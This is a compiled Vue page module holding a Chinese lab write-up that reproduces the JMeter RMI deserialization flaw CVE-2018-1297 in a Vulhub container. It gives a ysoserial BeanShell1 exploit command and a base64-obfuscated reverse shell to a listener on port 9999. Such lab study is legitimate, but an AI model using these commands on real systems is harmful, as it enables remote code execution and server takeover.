import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as t}from"./app-58e4a7d6.js";const s={},r=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache JMeter是美国阿帕奇（Apache）软件基金会的一套使用Java语言编写的用于压力测试和性能测试的开源软件。其2.x版本和3.x版本中存在反序列化漏洞，攻击者可以利用该漏洞在目标服务器上执行任意命令。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>运行完成后，将启动一个RMI服务并监听1099端口。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接使用ysoserial即可进行利用：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 &#39;touch /tmp/success&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241842237.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们使用的是BeanShell1这条利用链。使用<code>docker-compose exec jmeter bash</code>进入容器，可见<code>/tmp/success</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241843397.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 192.168.174.128 1099 BeanShell1 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听9999端口，成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241846550.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),l=[r];function c(d,n){return a(),i("div",null,l)}const h=e(s,[["render",c],["__file","Jmeter RMI 反序列化命令执行漏洞 CVE-2018-1297.html.vue"]]);export{h as default};
